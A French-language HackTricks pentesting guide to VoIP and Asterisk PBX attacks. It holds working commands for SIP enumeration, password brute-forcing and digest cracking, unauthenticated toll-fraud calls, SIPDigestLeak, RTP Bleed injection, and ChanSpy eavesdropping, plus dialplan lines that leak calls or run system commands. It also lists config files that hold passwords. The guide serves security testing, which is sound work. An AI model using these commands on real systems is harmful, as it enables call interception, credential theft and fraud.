# Pentesting VoIP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base sur la VoIP

Pour commencer √† apprendre comment fonctionne la VoIP, consultez :

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## √ânum√©ration de la VoIP

### Num√©ros de t√©l√©phone

Une des premi√®res √©tapes qu'une √©quipe Red peut faire est de rechercher des num√©ros de t√©l√©phone disponibles pour contacter l'entreprise en utilisant des outils OSINT, des recherches Google ou en parcourant les pages web.

Une fois que vous avez les num√©ros de t√©l√©phone, vous pouvez utiliser des services en ligne pour identifier l'op√©rateur :

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Savoir si l'op√©rateur fournit des services VoIP peut vous permettre d'identifier si l'entreprise utilise la VoIP... De plus, il est possible que l'entreprise n'ait pas engag√© de services VoIP mais utilise des cartes PSTN pour connecter son propre PBX VoIP au r√©seau t√©l√©phonique traditionnel.

Des choses comme les r√©ponses automatis√©es de musique indiquent g√©n√©ralement que la VoIP est utilis√©e.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informations OSINT

Toute autre enqu√™te OSINT qui aide √† identifier le logiciel VoIP utilis√© sera utile pour une √©quipe rouge.

### √ânum√©ration du r√©seau

* **`nmap`** est capable de scanner les services UDP, mais en raison du nombre de services UDP scann√©s, il est tr√®s lent et peut ne pas √™tre tr√®s pr√©cis avec ce type de services.
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`) : localisera les services SIP dans le r√©seau indiqu√©.
* `svmap` est **facile √† bloquer** car il utilise l'User-Agent `friendly-scanner`, mais vous pouvez modifier le code de `/usr/share/sipvicious/sipvicious` et le changer.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan est un scanner tr√®s rapide pour les services SIP sur UDP, TCP ou TLS. Il utilise le multithreading et peut scanner de grandes plages de r√©seaux. Il permet de sp√©cifier facilement une plage de ports, de scanner √† la fois TCP et UDP, d'utiliser une autre m√©thode (par d√©faut, il utilisera OPTIONS) et de sp√©cifier un User-Agent diff√©rent (et plus encore).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit est un framework de test de p√©n√©tration open source largement utilis√© pour l'exploitation de vuln√©rabilit√©s et la r√©alisation de tests de s√©curit√©. Il offre une vaste gamme d'outils et de fonctionnalit√©s pour effectuer des attaques cibl√©es sur les syst√®mes informatiques. Metasploit permet aux testeurs de p√©n√©tration d'automatiser les t√¢ches de recherche de vuln√©rabilit√©s, d'exploitation et de post-exploitation, ce qui en fait un outil essentiel pour les professionnels de la s√©curit√© informatique.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeration suppl√©mentaire du r√©seau

Le PBX pourrait √©galement exposer d'autres services r√©seau tels que :

* **69/UDP (TFTP)** : Mises √† jour du micrologiciel
* **80 (HTTP) / 443 (HTTPS)** : Pour g√©rer l'appareil depuis le web
* **389 (LDAP)** : Alternative pour stocker les informations des utilisateurs
* **3306 (MySQL)** : Base de donn√©es MySQL
* **5038 (Manager)** : Permet d'utiliser Asterisk depuis d'autres plateformes
* **5222 (XMPP)** : Messages utilisant Jabber
* **5432 (PostgreSQL)** : Base de donn√©es PostgreSQL
* Et d'autres...

### √ânum√©ration des m√©thodes

Il est possible de trouver **quelles m√©thodes sont disponibles** pour utiliser dans le PBX en utilisant `sipenumerate.py` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### √ânum√©ration des extensions

Les extensions dans un syst√®me PBX (Private Branch Exchange) font r√©f√©rence aux **identifiants internes uniques attribu√©s √† chaque** ligne t√©l√©phonique, appareil ou utilisateur au sein d'une organisation ou d'une entreprise. Les extensions permettent de **routage des appels au sein de l'organisation de mani√®re efficace**, sans avoir besoin de num√©ros de t√©l√©phone externes individuels pour chaque utilisateur ou appareil.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` est un scanner gratuit de lignes d'extension SIP PBX. En concept, il fonctionne de mani√®re similaire aux wardialers traditionnels en **devinant une plage d'extensions ou une liste donn√©e d'extensions**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identifie les extensions sur un serveur SIP. Sipexten peut v√©rifier de grands r√©seaux et des plages de ports.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Vous pouvez √©galement √©num√©rer les extensions/noms d'utilisateur avec metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** est un **√©num√©rateur de force brute de noms d'utilisateur** pour le protocole Inter Asterisk Exchange (IAX). enumIAX peut fonctionner selon deux modes distincts : Deviner les noms d'utilisateur de mani√®re s√©quentielle ou Attaque par dictionnaire.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attaques VoIP

### Brute-Force de mot de passe

Apr√®s avoir d√©couvert le **PBX** et certains **extensions/noms d'utilisateur**, une √©quipe Red peut essayer de s'authentifier via la m√©thode `REGISTER` sur une extension en utilisant un dictionnaire de mots de passe courants pour forcer l'authentification.

{% hint style="danger" %}
Notez qu'un **nom d'utilisateur** peut √™tre identique √† l'extension, mais cette pratique peut varier en fonction du syst√®me PBX, de sa configuration et des pr√©f√©rences de l'organisation...

Si le nom d'utilisateur n'est pas identique √† l'extension, vous devrez **d√©terminer le nom d'utilisateur pour le forcer par brute-force**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`) : SVCrack vous permet de cracker le mot de passe d'un nom d'utilisateur/extension sp√©cifique sur un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack est un outil pour cracker les authentifications digest dans le protocole SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing VoIP

Si vous trouvez du mat√©riel VoIP √† l'int√©rieur d'un **r√©seau Wifi ouvert**, vous pouvez **capturer toutes les informations**. De plus, si vous √™tes √† l'int√©rieur d'un r√©seau plus ferm√© (connect√© via Ethernet ou Wifi prot√©g√©), vous pouvez effectuer des attaques **MitM telles que** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre le **PBX et la passerelle** afin de capturer les informations.

Parmi les informations r√©seau, vous pouvez trouver des **identifiants web** pour g√©rer le mat√©riel, des **extensions d'utilisateur**, des **noms d'utilisateur**, des **adresses IP**, m√™me des **mots de passe hach√©s** et des **paquets RTP** que vous pouvez reproduire pour **√©couter la conversation**, et plus encore.

Pour obtenir ces informations, vous pouvez utiliser des outils tels que Wireshark, tcpdump... mais un **outil sp√©cialement cr√©√© pour capturer les conversations VoIP est** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Notez que si **TLS est utilis√© dans la communication SIP**, vous ne pourrez pas voir la communication SIP en clair.\
La m√™me chose se produira si **SRTP** et **ZRTP** sont utilis√©s, les **paquets RTP ne seront pas en texte clair**.
{% endhint %}

#### Identifiants SIP

[V√©rifiez cet exemple pour mieux comprendre une **communication SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) pour apprendre comment les **identifiants sont envoy√©s**.

* **`sipdump`** & **`sipcrack`,** partie de **sipcrack** (`apt-get install sipcrack`): Ces outils peuvent **extraire** d'un **pcap** les **authentifications digest** dans le protocole SIP et les **forcer par bruteforce**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** extrait les donn√©es du protocole SIP √† partir d'un fichier PCAP.
* **SipDump** extrait les authentifications SIP Digest √† partir d'un fichier PCAP.
* **SIP Digest Crack** est un outil pour cracker les authentifications digest dans le protocole SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### Codes DTMF

**Non seulement les identifiants SIP** peuvent √™tre trouv√©s dans le trafic r√©seau, il est √©galement possible de trouver des codes DTMF qui sont utilis√©s par exemple pour acc√©der √† la **messagerie vocale**.\
Il est possible d'envoyer ces codes dans des **messages INFO SIP**, dans l'**audio** ou √† l'int√©rieur des **paquets RTP**. Si les codes se trouvent dans les paquets RTP, vous pouvez d√©couper cette partie de la conversation et utiliser l'outil multimo pour les extraire :
```bash
multimon -a DTMF -t wac pin.wav
```
### Appels gratuits / Mauvaises configurations de connexions Asterisk

Dans Asterisk, il est possible d'autoriser une connexion **√† partir d'une adresse IP sp√©cifique** ou de **n'importe quelle adresse IP** :
```
host=10.10.10.10
host=dynamic
```
Si une adresse IP est sp√©cifi√©e, l'h√¥te **n'aura pas besoin d'envoyer des requ√™tes REGISTER** de temps en temps (dans le paquet REGISTER est envoy√© le temps de vie, g√©n√©ralement 30 minutes, ce qui signifie que dans un autre sc√©nario, le t√©l√©phone devra s'enregistrer toutes les 30 minutes). Cependant, il devra avoir des ports ouverts permettant les connexions du serveur VoIP pour prendre des appels.

Pour d√©finir les utilisateurs, ils peuvent √™tre d√©finis comme suit :

* **`type=user`** : L'utilisateur ne peut recevoir que des appels en tant qu'utilisateur.
* **`type=friend`** : Il est possible d'effectuer des appels en tant que pair et de les recevoir en tant qu'utilisateur (utilis√© avec des extensions).
* **`type=peer`** : Il est possible d'envoyer et de recevoir des appels en tant que pair (SIP-trunks).

Il est √©galement possible d'√©tablir une confiance avec la variable non s√©curis√©e :

* **`insecure=port`** : Autorise les connexions de pair valid√©es par IP.
* **`insecure=invite`** : Ne n√©cessite pas d'authentification pour les messages INVITE.
* **`insecure=port,invite`** : Les deux.

{% hint style="warning" %}
Lorsque **`type=friend`** est utilis√©, la **valeur** de la variable **host** ne sera pas utilis√©e, donc si un administrateur **mal configure un SIP-trunk** en utilisant cette valeur, **n'importe qui pourra s'y connecter**.

Par exemple, cette configuration serait vuln√©rable :\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Appels gratuits / Mauvaises configurations de contexte dans Asterisk

Dans Asterisk, un **contexte** est un conteneur ou une section nomm√©e dans le plan de num√©rotation qui **regroupe les extensions, les actions et les r√®gles** associ√©es. Le plan de num√©rotation est le composant central d'un syst√®me Asterisk, car il d√©finit **comment les appels entrants et sortants sont g√©r√©s et rout√©s**. Les contextes sont utilis√©s pour organiser le plan de num√©rotation, g√©rer le contr√¥le d'acc√®s et fournir une s√©paration entre les diff√©rentes parties du syst√®me.

Chaque contexte est d√©fini dans le fichier de configuration, g√©n√©ralement dans le fichier **`extensions.conf`**. Les contextes sont indiqu√©s par des crochets, avec le nom du contexte entre eux. Par exemple :
```bash
csharpCopy code[my_context]
```
Dans le contexte, vous d√©finissez des extensions (mod√®les de num√©ros compos√©s) et les associez √† une s√©rie d'actions ou d'applications. Ces actions d√©terminent la fa√ßon dont l'appel est trait√©. Par exemple :
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Cet exemple pr√©sente un contexte simple appel√© "my\_context" avec une extension "100". Lorsque quelqu'un compose le 100, l'appel sera r√©pondu, un message de bienvenue sera diffus√©, puis l'appel sera termin√©.

Voici **un autre contexte** qui permet d'**appeler n'importe quel autre num√©ro** :
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si l'administrateur d√©finit le **contexte par d√©faut** comme suit :
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
N'importe qui pourra utiliser le **serveur pour appeler n'importe quel autre num√©ro** (et l'administrateur du serveur paiera l'appel).
{% endhint %}

{% hint style="danger" %}
De plus, par d√©faut, le fichier **`sip.conf`** contient **`allowguest=true`**, ce qui signifie que **n'importe quel** attaquant sans **authentification** pourra appeler n'importe quel autre num√©ro.
{% endhint %}

*   **`sipinvite.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite v√©rifie si un serveur PBX nous permet de passer des appels sans authentification. Si le serveur SIP a une configuration incorrecte, il nous permettra de passer des appels vers des num√©ros externes. Il peut √©galement nous permettre de transf√©rer l'appel vers un deuxi√®me num√©ro externe.

Par exemple, si votre serveur Asterisk a une mauvaise configuration de contexte, vous pouvez accepter une demande INVITE sans autorisation. Dans ce cas, un attaquant peut passer des appels sans conna√Ætre aucun nom d'utilisateur/mot de passe.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Appels gratuits / IVRS mal configur√©

IVRS signifie **Interactive Voice Response System**, une technologie de t√©l√©phonie qui permet aux utilisateurs d'interagir avec un syst√®me informatis√© par la voix ou des touches. IVRS est utilis√© pour construire des syst√®mes de gestion d'appels automatis√©s qui offrent une gamme de fonctionnalit√©s, telles que la fourniture d'informations, la redirection des appels et la collecte des entr√©es des utilisateurs.

Les IVRS dans les syst√®mes VoIP se composent g√©n√©ralement de :

1. **Messages vocaux**: Messages audio pr√©enregistr√©s qui guident les utilisateurs √† travers les options de menu et les instructions de l'IVR.
2. **Signalisation DTMF** (Dual-Tone Multi-Frequency) : Entr√©es de touches g√©n√©r√©es en appuyant sur les touches du t√©l√©phone, qui sont utilis√©es pour naviguer dans les menus de l'IVR et fournir des entr√©es.
3. **Routage des appels**: Redirection des appels vers la destination appropri√©e, tels que des d√©partements sp√©cifiques, des agents ou des extensions en fonction des entr√©es des utilisateurs.
4. **Collecte des entr√©es des utilisateurs**: Collecte d'informations aupr√®s des appelants, telles que des num√©ros de compte, des identifiants de cas ou toute autre donn√©e pertinente.
5. **Int√©gration avec des syst√®mes externes**: Connexion du syst√®me IVR √† des bases de donn√©es ou √† d'autres syst√®mes logiciels pour acc√©der ou mettre √† jour des informations, effectuer des actions ou d√©clencher des √©v√©nements.

Dans un syst√®me VoIP Asterisk, vous pouvez cr√©er un IVR en utilisant le plan de num√©rotation (fichier **`extensions.conf`**) et diverses applications telles que `Background()`, `Playback()`, `Read()`, et plus encore. Ces applications vous aident √† lire des messages vocaux, √† capturer les entr√©es des utilisateurs et √† contr√¥ler le flux des appels.

#### Exemple de configuration vuln√©rable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Le pr√©c√©dent est un exemple o√π l'utilisateur est invit√© √† **appuyer sur 1 pour appeler** un d√©partement, **2 pour appeler** un autre, ou **l'extension compl√®te** s'il la conna√Æt.\
La vuln√©rabilit√© r√©side dans le fait que la **longueur de l'extension n'est pas v√©rifi√©e, donc un utilisateur pourrait entrer un num√©ro complet et il sera appel√© m√™me s'il d√©passe le d√©lai de 5 secondes.**

### Injection d'extension

En utilisant une extension telle que :
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
L√† o√π **`${EXTEN}`** est l'**extension** qui sera appel√©e, lorsque l'**ext 101 est introduit**, voici ce qui se passerait :
```scss
exten => 101,1,Dial(SIP/101)
```
Cependant, si **`${EXTEN}`** permet d'introduire **autre chose que des chiffres** (comme dans les anciennes versions d'Asterisk), un attaquant pourrait introduire **`101&SIP123123123`** pour appeler le num√©ro de t√©l√©phone 123123123. Et voici le r√©sultat :
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Par cons√©quent, un appel √† l'extension **`101`** et **`123123123`** sera envoy√© et seul le premier appel√© sera √©tabli... mais si un attaquant utilise une **extension qui contourne toute correspondance** qui est en cours mais qui n'existe pas, il pourrait **injecter un appel uniquement vers le num√©ro souhait√©**.

## SIPDigestLeak

La fuite de Digest SIP est une vuln√©rabilit√© qui affecte un grand nombre de t√©l√©phones SIP, y compris les t√©l√©phones IP mat√©riels et logiciels ainsi que les adaptateurs t√©l√©phoniques (VoIP vers analogique). La vuln√©rabilit√© permet la **fuite de la r√©ponse d'authentification Digest**, qui est calcul√©e √† partir du mot de passe. Une **attaque de mot de passe hors ligne est alors possible** et peut r√©cup√©rer la plupart des mots de passe bas√©s sur la r√©ponse au d√©fi.

Sc√©nario de vuln√©rabilit√© (pour [**plus d'informations, consultez ceci**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)) :

1. Un t√©l√©phone IP (victime) √©coute sur le port 5060, acceptant les appels t√©l√©phoniques
2. L'attaquant envoie une INVITE au t√©l√©phone IP
3. Le t√©l√©phone de la victime commence √† sonner et quelqu'un d√©croche et raccroche (parce que personne ne r√©pond au t√©l√©phone √† l'autre bout)
4. Lorsque le t√©l√©phone est raccroch√©, le **t√©l√©phone de la victime envoie un BYE √† l'attaquant**
5. L'attaquant √©met une r√©ponse 407 qui **demande une authentification** et √©met un d√©fi d'authentification
6. Le **t√©l√©phone de la victime fournit une r√©ponse au d√©fi d'authentification** dans un deuxi√®me BYE
7. L'attaquant peut ensuite lancer une attaque par force brute sur la r√©ponse au d√©fi sur sa machine locale (ou un r√©seau distribu√©, etc.) et deviner le mot de passe

* **sipdigestleak.py** de [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak exploite cette vuln√©rabilit√©.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permet √† un **utilisateur web** (qui par exemple pourrait √™tre int√©ress√© par un produit) d'**introduire** son **num√©ro de t√©l√©phone** pour √™tre appel√©. Ensuite, un commercial sera appel√© et lorsque l'utilisateur **d√©croche le t√©l√©phone**, il sera **appel√© et connect√© √† l'agent**.

Un profil Asterisk courant pour cela est :
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Le profil pr√©c√©dent permet √† **N'IMPORTE QUELLE adresse IP de se connecter** (si le mot de passe est connu).
* Pour **organiser un appel**, comme sp√©cifi√© pr√©c√©demment, **aucune permission de lecture n'est n√©cessaire** et **seulement** **l'autorisation d'origine en √©criture** est requise.

Avec ces autorisations, n'importe quelle adresse IP connaissant le mot de passe pourrait se connecter et extraire trop d'informations, telles que :

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Plus d'informations ou d'actions peuvent √™tre demand√©es.**

### **√âcoute clandestine**

Dans Asterisk, il est possible d'utiliser la commande **`ChanSpy`** en indiquant les **extensions √† surveiller** (ou toutes) pour √©couter les conversations en cours. Cette commande doit √™tre attribu√©e √† une extension.

Par exemple, **`exten => 333,1,ChanSpy('all',qb)`** indique que si vous **appelez** l'**extension 333**, elle **surveillera** toutes les extensions, **commencera √† √©couter** d√®s qu'une nouvelle conversation commence (**`b`**) en mode silencieux (**`q`**) car nous ne voulons pas y intervenir. Vous pouvez passer d'une conversation √† une autre en appuyant sur **`*`**, ou en marquant le num√©ro de l'extension.

Il est √©galement possible d'utiliser **`ExtenSpy`** pour surveiller une seule extension.

Au lieu d'√©couter les conversations, il est possible de les **enregistrer dans des fichiers** en utilisant une extension telle que :

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Les appels seront enregistr√©s dans **`/tmp`**.

Vous pouvez m√™me faire en sorte qu'Asterisk **ex√©cute un script qui divulguera l'appel** lorsqu'il est ferm√©.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** est un probl√®me de s√©curit√© majeur qui affecte les serveurs VoIP bas√©s sur Asterisk (publi√© en 2017). La vuln√©rabilit√© permet √† tout utilisateur sur Internet d'**intercepter et de rediriger le trafic RTP (Real Time Protocol)**, qui transporte les conversations VoIP. Cela se produit car le trafic RTP contourne l'authentification lorsqu'il traverse les pare-feu NAT (Network Address Translation).

Les proxies RTP tentent de r√©soudre les **limitations NAT** affectant les syst√®mes RTC en faisant office de relais pour les flux RTP entre deux parties ou plus. Lorsque NAT est en place, le logiciel du proxy RTP ne peut souvent pas se fier aux informations d'adresse IP et de port RTP r√©cup√©r√©es via la signalisation (par exemple, SIP). Par cons√©quent, plusieurs proxies RTP ont mis en ≈ìuvre un m√©canisme o√π cette **combinaison d'adresse IP et de port est apprise automatiquement**. Cela est souvent r√©alis√© en inspectant le trafic RTP entrant et en marquant l'adresse IP et le port source de tout trafic RTP entrant comme √©tant ceux auxquels il faut r√©pondre. Ce m√©canisme, souvent appel√© "mode d'apprentissage", **n'utilise aucune forme d'authentification**. Par cons√©quent, les **attaquants** peuvent **envoyer du trafic RTP au proxy RTP** et recevoir le trafic RTP relay√© destin√© √† l'appelant ou au destinataire d'un flux RTP en cours. Nous appelons cette vuln√©rabilit√© RTP Bleed car elle permet aux attaquants de recevoir des flux m√©dia RTP destin√©s √† des utilisateurs l√©gitimes.

Un autre comportement int√©ressant des proxies RTP et des piles RTP est que parfois, **m√™me s'ils ne sont pas vuln√©rables √† RTP Bleed**, ils **acceptent, transf√®rent et/ou traitent les paquets RTP en provenance de n'importe quelle source**. Par cons√©quent, les attaquants peuvent envoyer des paquets RTP qui leur permettent d'injecter leurs propres m√©dias au lieu des m√©dias l√©gitimes. Nous appelons cette attaque l'injection RTP car elle permet l'injection de paquets RTP ill√©gitimes dans des flux RTP existants. Cette vuln√©rabilit√© peut √™tre pr√©sente √† la fois dans les proxies RTP et les points d'extr√©mit√©.

Asterisk et FreePBX ont traditionnellement utilis√© le param√®tre **`NAT=yes`**, qui permet au trafic RTP de contourner l'authentification, ce qui peut entra√Æner une absence de son ou un son unidirectionnel lors des appels.

Pour plus d'informations, consultez [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Il d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Il d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Exploitez la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Exploitez la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP (√† partir d'un fichier audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Dans Asterisk, si vous parvenez d'une mani√®re ou d'une autre √† **ajouter des r√®gles d'extension et √† les recharger** (par exemple en compromettant un serveur de gestion web vuln√©rable), il est possible d'obtenir une RCE en utilisant la commande **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Il existe une commande appel√©e **`Shell`** qui peut √™tre utilis√©e **√† la place de `System`** pour ex√©cuter des commandes syst√®me si n√©cessaire.

{% hint style="warning" %}
Si le serveur **interdit l'utilisation de certains caract√®res** dans la commande **`System`** (comme dans Elastix), v√©rifiez si le serveur Web permet de **cr√©er des fichiers dans le syst√®me** d'une mani√®re ou d'une autre (comme dans Elastix ou trixbox), et utilisez-le pour **cr√©er un script de porte d√©rob√©e** que vous pourrez ensuite ex√©cuter avec **`System`**.
{% endhint %}

#### Fichiers locaux int√©ressants et autorisations

* **`sip.conf`** -> Contient le mot de passe des utilisateurs SIP.
* Si le serveur **Asterisk s'ex√©cute en tant que root**, vous pouvez compromettre le compte root.
* L'utilisateur **root de MySQL** pourrait **ne pas avoir de mot de passe**.
* Cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur MySQL en tant que porte d√©rob√©e.
* **`FreePBX`**
* **`amportal.conf`** -> Contient le mot de passe de l'administrateur du panneau Web (FreePBX).
* **`FreePBX.conf`** -> Contient le mot de passe de l'utilisateur FreePBXuser utilis√© pour acc√©der √† la base de donn√©es.
* Cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur MySQL en tant que porte d√©rob√©e.
* **`Elastix`**
* **`Elastix.conf`** -> Contient plusieurs mots de passe en clair, tels que le mot de passe root de MySQL, le mot de passe IMAPd, le mot de passe de l'administrateur Web.
